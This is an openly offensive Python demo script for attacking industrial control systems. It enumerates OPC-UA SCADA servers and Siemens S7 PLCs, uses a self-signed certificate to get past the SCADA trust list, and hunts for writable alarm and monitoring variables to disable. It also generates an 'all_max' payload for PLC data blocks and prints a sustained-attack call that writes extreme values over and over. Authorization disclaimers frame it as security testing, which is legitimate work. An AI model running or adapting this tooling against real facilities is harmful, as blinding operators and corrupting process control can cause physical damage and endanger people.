#!/usr/bin/env python3
"""
Combined ICS Attack Scenario

Demonstrates a multi-protocol ICS attack scenario where both
OPC-UA and S7comm are used to compromise an industrial facility.

Scenario:
- Facility has OPC-UA SCADA server for monitoring
- Facility has S7 PLCs for process control
- Attack disables monitoring while manipulating PLC

WARNING: This is for authorized security testing only.
Do not use against systems without explicit authorization.

Usage:
    python combined_ics_attack.py \
        --opcua opc.tcp://scada:4840 \
        --s7-ip 192.168.1.1 \
        --s7-port 36815 \
        --hmi-url http://192.168.1.1:8080/status
"""

import sys
import os
import argparse
import time

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from ics_exploitation_mcp import ICSExploitationMCP


def print_banner():
    print("""
    ================================================================
     Combined ICS Attack - Multi-Protocol Exploitation Demo
    ================================================================
    
    Target Environment:
    - OPC-UA SCADA Server (monitoring/supervisory)
    - Siemens S7 PLCs (process control)
    - Web HMI (operator interface)
    
    Attack Phases:
    1. Reconnaissance - Enumerate both protocols
    2. SCADA Compromise - Disable monitoring via OPC-UA
    3. PLC Attack - Manipulate process via S7comm
    4. Persistence - Maintain fault conditions
    
    ================================================================
    """)


def phase1_recon(mcp: ICSExploitationMCP, opcua_url: str, s7_ip: str, s7_port: int):
    """Phase 1: Reconnaissance"""
    print("\n" + "=" * 60)
    print("[PHASE 1] RECONNAISSANCE")
    print("=" * 60)
    
    results = {
        "opcua_available": False,
        "s7_available": False,
        "opcua_policies": [],
        "s7_cpu": None
    }
    
    # OPC-UA Recon
    if opcua_url:
        print(f"\n[*] OPC-UA Enumeration: {opcua_url}")
        endpoints = mcp.opcua.enumerate_endpoints(opcua_url)
        if "error" not in endpoints:
            results["opcua_available"] = True
            results["opcua_policies"] = endpoints.get("security_policies", [])
            print(f"    [+] Endpoints found: {endpoints['endpoint_count']}")
            print(f"    [+] Security policies: {results['opcua_policies']}")
            print(f"    [+] Recommendation: {endpoints.get('recommendation')}")
        else:
            print(f"    [-] OPC-UA failed: {endpoints['error']}")
    
    # S7comm Recon
    if s7_ip:
        print(f"\n[*] S7comm Enumeration: {s7_ip}:{s7_port}")
        conn_result = mcp.s7.connect(s7_ip, rack=0, slot=0, port=s7_port)
        if conn_result.get("success"):
            results["s7_available"] = True
            results["s7_cpu"] = conn_result.get("cpu_type", "Unknown")
            print(f"    [+] Connected to: {results['s7_cpu']}")
            
            blocks = mcp.s7.list_blocks()
            if blocks.get("success"):
                print(f"    [+] Data blocks: {blocks['blocks'].get('DB', 0)}")
            
            mcp.s7.disconnect()
        else:
            print(f"    [-] S7comm failed: {conn_result.get('error')}")
    
    return results


def phase2_scada_compromise(mcp: ICSExploitationMCP, opcua_url: str, policies: list):
    """Phase 2: Compromise SCADA monitoring via OPC-UA"""
    print("\n" + "=" * 60)
    print("[PHASE 2] SCADA COMPROMISE (OPC-UA)")
    print("=" * 60)
    
    # Generate certificate for trust list bypass
    print("\n[*] Generating certificate for trust list bypass...")
    certs = mcp.opcua.generate_self_signed_cert("./attack_certs", "SCADAAdmin")
    if "error" in certs:
        print(f"    [-] Certificate generation failed: {certs['error']}")
        return False
    print(f"    [+] Certificate: {certs['cert_path']}")
    
    # Connect with strongest available policy
    policy = "Basic256Sha256" if "Basic256Sha256" in policies else \
             "Basic256" if "Basic256" in policies else \
             "Basic128Rsa15" if "Basic128Rsa15" in policies else "None"
    mode = "SignAndEncrypt" if policy != "None" else "None"
    
    print(f"\n[*] Connecting with {policy}/{mode}...")
    result = mcp.opcua.connect(
        url=opcua_url,
        cert_path=certs['cert_path'],
        key_path=certs['key_path'],
        security_policy=policy,
        security_mode=mode
    )
    
    if "error" in result:
        print(f"    [-] Connection failed: {result['error']}")
        return False
    print("    [+] Connected to SCADA!")
    
    # Find monitoring/alarm variables
    print("\n[*] Enumerating SCADA variables...")
    writable = mcp.opcua.find_writable_variables(max_depth=5)
    if "error" not in writable:
        print(f"    [+] Found {writable['count']} writable variables")
        
        # Look for alarm/monitoring systems
        monitoring_vars = []
        for var in writable['variables']:
            path_lower = var['path'].lower()
            if any(k in path_lower for k in ['alarm', 'monitor', 'alert', 'status']):
                monitoring_vars.append(var)
                print(f"    [MONITOR] {var['path']} = {var['value']}")
        
        if monitoring_vars:
            print(f"\n[*] Could disable {len(monitoring_vars)} monitoring variables")
            print("    (Not actually disabling in this demo)")
    
    # Keep connection for Phase 3 coordination
    return True


def phase3_plc_attack(mcp: ICSExploitationMCP, s7_ip: str, s7_port: int, hmi_url: str):
    """Phase 3: Attack PLC process control via S7comm"""
    print("\n" + "=" * 60)
    print("[PHASE 3] PLC ATTACK (S7comm)")
    print("=" * 60)
    
    # Connect to PLC
    print(f"\n[*] Connecting to PLC: {s7_ip}:{s7_port}")
    result = mcp.s7.connect(s7_ip, rack=0, slot=0, port=s7_port)
    if not result.get("success"):
        print(f"    [-] Connection failed: {result.get('error')}")
        return False
    print(f"    [+] Connected to: {result.get('cpu_type', 'PLC')}")
    
    # Read current state
    print("\n[*] Reading current PLC state...")
    data = mcp.s7.db_read(db_number=1, offset=0, size=128)
    if data.get("success"):
        print(f"    [+] Read {data['size']} bytes from DB1")
        print(f"    [+] Non-zero bytes: {data['non_zero_count']}")
    
    # Generate attack payload
    print("\n[*] Generating attack payload...")
    payload = mcp.s7.generate_payload("all_max", 64)
    print(f"    [+] Payload: {payload['payload'][:32]}...")
    
    # Demonstrate write capability (but don't actually attack)
    print("\n[*] Attack vectors identified:")
    print("    - Could write extreme values to control variables")
    print("    - Could use sustained_attack() for persistent faults")
    print("    - Could correlate with HMI to find critical offsets")
    
    if hmi_url:
        print(f"\n[*] HMI available at: {hmi_url}")
        print("    - Use s7_scan_db_effects() to map memory")
        print("    - Use s7_monitor_status() to observe changes")
    
    return True


def phase4_persistence(mcp: ICSExploitationMCP):
    """Phase 4: Maintain persistent fault conditions"""
    print("\n" + "=" * 60)
    print("[PHASE 4] PERSISTENCE")
    print("=" * 60)
    
    print("\n[*] Persistence techniques:")
    print("    1. sustained_attack() - Continuous PLC writes")
    print("    2. Keep SCADA monitoring disabled via OPC-UA")
    print("    3. Poll HMI for status changes")
    
    print("\n[*] Example sustained attack command:")
    print("""
    result = mcp.s7.sustained_attack(
        db_number=1,
        offset=0,
        data="FF" * 128,
        duration_seconds=120,
        interval_ms=200,
        status_url="http://target:8080/status"
    )
    if result['success']:
        print("Attack successful")
    """)


def cleanup(mcp: ICSExploitationMCP):
    """Cleanup connections"""
    print("\n" + "=" * 60)
    print("[CLEANUP]")
    print("=" * 60)
    
    print("\n[*] Disconnecting from OPC-UA...")
    mcp.opcua.disconnect()
    
    print("[*] Disconnecting from S7comm...")
    mcp.s7.disconnect()
    
    print("[+] All connections closed")


def main():
    parser = argparse.ArgumentParser(description="Combined ICS Attack Demo")
    parser.add_argument("--opcua", help="OPC-UA server URL (opc.tcp://host:port)")
    parser.add_argument("--s7-ip", help="S7 PLC IP address")
    parser.add_argument("--s7-port", type=int, default=102, help="S7 PLC port")
    parser.add_argument("--hmi-url", help="HMI status URL (http://host:port/status)")
    args = parser.parse_args()
    
    if not args.opcua and not args.s7_ip:
        print("Error: Must specify at least --opcua or --s7-ip")
        parser.print_help()
        return 1
    
    print_banner()
    
    # Check installation
    mcp = ICSExploitationMCP()
    status = mcp.check_installation()
    
    print("Installation Status:")
    print(f"  OPC-UA: {'Ready' if status['protocols']['opcua']['available'] else 'Not installed'}")
    print(f"  S7comm: {'Ready' if status['protocols']['s7comm']['available'] else 'Not installed'}")
    
    if not status['any_protocol_ready']:
        print("\nError: No protocols available. Install dependencies:")
        print("  pip install opcua cryptography python-snap7")
        return 1
    
    try:
        # Phase 1: Reconnaissance
        recon = phase1_recon(mcp, args.opcua, args.s7_ip, args.s7_port)
        
        # Phase 2: SCADA Compromise (if OPC-UA available)
        if recon['opcua_available'] and args.opcua:
            phase2_scada_compromise(mcp, args.opcua, recon['opcua_policies'])
        
        # Phase 3: PLC Attack (if S7 available)
        if recon['s7_available'] and args.s7_ip:
            phase3_plc_attack(mcp, args.s7_ip, args.s7_port, args.hmi_url)
        
        # Phase 4: Persistence discussion
        phase4_persistence(mcp)
        
    finally:
        cleanup(mcp)
    
    print("\n" + "=" * 60)
    print("ATTACK DEMONSTRATION COMPLETE")
    print("=" * 60)
    print("\nRemember: Only use these techniques against systems you")
    print("have explicit authorization to test!")
    
    return 0


if __name__ == "__main__":
    sys.exit(main())
